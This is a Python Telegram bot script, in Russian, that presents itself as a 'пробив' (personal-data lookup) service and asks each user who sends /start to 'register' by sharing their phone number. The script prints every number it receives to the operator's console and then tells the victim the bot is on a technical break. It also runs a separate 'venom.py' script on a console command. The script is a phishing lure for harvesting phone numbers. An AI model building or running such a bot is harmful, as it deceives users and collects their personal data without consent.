import os
import telebot
from telebot import types
import threading
from pystyle import Colorate, Colors

COLOR_CODE = {
	"GREEN": "\033[36m",
	"BOLD": "\033[01m",
	"RESET": "\033[0m",
}

bot_token = input(f'{COLOR_CODE["GREEN"]}Введите токен вашего бота (если захотите выйти, введите 9):')

bot = telebot.TeleBot(bot_token)

def listen_for_input():
    while True:
        command = input()
        if command == "9":
            print(f"{COLOR_CODE["GREEN"]}Переходик...")
            exec(open('venom.py').read())

input_thread = threading.Thread(target=listen_for_input)
input_thread.daemon = True
input_thread.start()

@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button_phone = types.KeyboardButton(text="Регистрация", request_contact=True)
    keyboard.add(button_phone)
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('color 0A')  # Зеленый цвет текста на черном фоне
    print("\n\n\n")
    print("Добро пожаловать в бот по пробиву! Нажмите кнопку ниже, чтобы зарегистрироваться.")
    bot.send_message(message.chat.id, "Добро пожаловать в бот по пробиву! Нажмите кнопку ниже, чтобы зарегистрироваться.", reply_markup=keyboard)

@bot.message_handler(content_types=['contact'])
def contact(message):
    if message.contact is not None:
        phone_number = message.contact.phone_number
        print(f"{COLOR_CODE["GREEN"]}Получен номер телефона: {phone_number}")
        bot.send_message(message.chat.id, "Бот на техническомперерыве мы вас оповестим когда он закончиться!")

bot.polling()
